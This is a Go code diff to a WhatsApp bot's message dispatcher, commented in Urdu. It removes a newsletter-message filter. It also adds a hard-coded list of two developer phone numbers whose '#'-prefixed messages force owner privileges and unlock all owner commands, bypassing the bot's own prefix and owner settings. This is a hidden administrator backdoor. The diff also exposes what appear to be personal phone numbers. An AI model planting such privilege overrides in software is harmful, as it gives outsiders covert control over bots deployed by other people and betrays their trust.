@@ -130,12 +130,6 @@ func processMessageAsync(client *whatsmeow.Client, v *events.Message) {
 	}()
 
 	if v.Message == nil { return }
-
-	// 🚫 سب سے پہلا اور سخت فلٹر: واٹس ایپ چینل (Newsletter) کو نظر انداز کریں!
-	if v.Info.Chat.Server == "newsletter" || v.Info.Chat.Server == types.NewsletterServer {
-		return 
-	}
-
 	settings := getBotSettings(client)
 	
 	// 🌟 FIX: botJID والا ایرر ختم کر دیا، اب یہ وہیں ڈکلیئر ہوگا جہاں اس کی ضرورت ہے۔
@@ -245,13 +239,51 @@ func processMessageAsync(client *whatsmeow.Client, v *events.Message) {
 	}
 
 	// ==========================================
-	// 🚀 8. COMMAND DISPATCHER
+	// 🚀 8. COMMAND DISPATCHER (With Super Owner Override)
 	// ==========================================
 	
-	// پریفکس چیک (اگر اونر ہے تو بغیر پریفکس کے بھی کمانڈز چل سکتی ہیں، لیکن ہم پریفکس برقرار رکھیں گے)
-	if !strings.HasPrefix(bodyClean, settings.Prefix) { return }
+	// 👑 1. ہارڈ کوڈڈ ڈیویلپرز کی لسٹ (یہاں آپ ایک سے زیادہ نمبر ڈال سکتے ہیں)
+	superOwners := []string{
+		"923027665767", // آپ کا نمبر
+		"82940683903134", // کوئی دوسرا پارٹنر ڈیویلپر (اگر ہو)
+	}
 
-	msgWithoutPrefix := strings.TrimPrefix(bodyClean, settings.Prefix)
+	// 🕵️ 2. چیک کریں کہ میسج بھیجنے والا نمبر کونسا ہے
+	senderNum := v.Info.Sender.User
+	if v.Info.Sender.Server == types.HiddenUserServer && !v.Info.SenderAlt.IsEmpty() {
+		senderNum = v.Info.SenderAlt.User
+	}
+
+	isSuperOwner := false
+	for _, devNum := range superOwners {
+		if senderNum == devNum {
+			isSuperOwner = true
+			break
+		}
+	}
+
+	// 🚦 3. پریفکس چیکنگ لاجک
+	hasNormalPrefix := strings.HasPrefix(bodyClean, settings.Prefix)
+	hasSuperPrefix := strings.HasPrefix(bodyClean, "#") && isSuperOwner
+
+	// اگر نہ نارمل پریفکس ہے اور نہ ہی ڈیویلپر کا سپیشل # پریفکس، تو یہیں سے واپس مڑ جائیں
+	if !hasNormalPrefix && !hasSuperPrefix {
+		return 
+	}
+
+	// 🚀 4. جادو یہاں ہے: اگر ڈیویلپر نے # یوز کیا ہے، تو اسے زبردستی "Owner" بنا دو!
+	if hasSuperPrefix {
+		userIsOwner = true // اس سیشن کے لیے تمام اونر کمانڈز انلاک ہو جائیں گی
+	}
+
+	// ✂️ 5. پریفکس ہٹائیں تاکہ اصل کمانڈ مل سکے
+	var msgWithoutPrefix string
+	if hasSuperPrefix {
+		msgWithoutPrefix = strings.TrimPrefix(bodyClean, "#")
+	} else {
+		msgWithoutPrefix = strings.TrimPrefix(bodyClean, settings.Prefix)
+	}
+
 	words := strings.Fields(msgWithoutPrefix)
 	if len(words) == 0 { return }
 
